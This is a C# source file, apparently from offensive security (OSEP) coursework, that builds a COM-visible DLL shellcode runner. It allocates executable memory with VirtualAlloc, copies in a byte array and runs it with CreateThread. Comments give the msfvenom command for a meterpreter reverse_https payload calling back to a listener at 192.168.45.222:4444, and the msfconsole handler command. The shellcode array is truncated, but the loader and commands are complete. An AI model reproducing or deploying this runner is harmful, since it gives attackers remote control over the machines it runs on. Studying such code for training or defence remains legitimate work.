using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace _005._2._5_Shellcode_Runner_CSharp_DLL
{
    [ComVisible(true)]
    public class OSEPShellcodeRunner
    {

        //IMPORT WIN32 API FUNCTIONS
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public void Run()
        {
            //SHELLCODE
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.222 LPORT=4444 EXITFUNC=thread -f csharp

            //LISTENER
            //msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost tun0; set lport 4444; run"
            byte[] buf = new byte[] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,
                0xcc,0x00,0x00,0x00,0x41,0x51,
                0x41,0x50,0x52,0x51,0x48,0x31,
                0xd2,0x56,0x65,0x48,0x8b,0x52,
                0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x41,0xb9,0xb2,
                0xe1,0x11,0x08,0x48,0x8b,0x72,
            };//...


            int size = buf.Length;


            //Allocate memory for the shellcode
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            //Copy the shellcode from managed memory (the .NET byte[]) to unmanaged memory. GC can't touch this memory because it's unmanaged.
            Marshal.Copy(buf, 0, addr, size);

            //Create a thread that points to the start of the shellcode. This will execute the shellcode in a new thread.
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            //This forces the main thread to wait for the shellcode thread to finish.
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

    }
}
